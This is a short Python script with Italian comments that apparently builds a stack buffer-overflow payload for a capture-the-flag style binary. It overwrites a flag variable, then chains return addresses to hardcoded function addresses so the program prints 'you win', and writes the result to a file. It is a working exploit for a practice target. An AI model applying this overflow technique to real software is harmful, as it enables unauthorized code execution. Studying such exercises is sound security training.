import os
import struct

#stampare you win usando get_input->vuln->flag

#la prima gets si usa per modificare il valore di flag
#la seconda gets per far eseguire le funzioni

string = 0x0804a060
vuln = 0x804846b
flagvalue = 0x0804a128
flag = 0x80484ce

payload = struct.pack("I", 0xdeadfeef)
payload += "A"*(128 - len(payload))
payload += struct.pack("I", flagvalue)

payload += "\n"

payload1 = "a"*148
payload1 += struct.pack("I", string)
payload1 += "D"*8
payload1 += struct.pack("I", vuln)
payload1 += "E"*4
#payload1 += "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"

payload1 += struct.pack("I", flag)

payload += payload1

f = open("badfile-win", "w")
f.write("%s" % payload)
f.close()
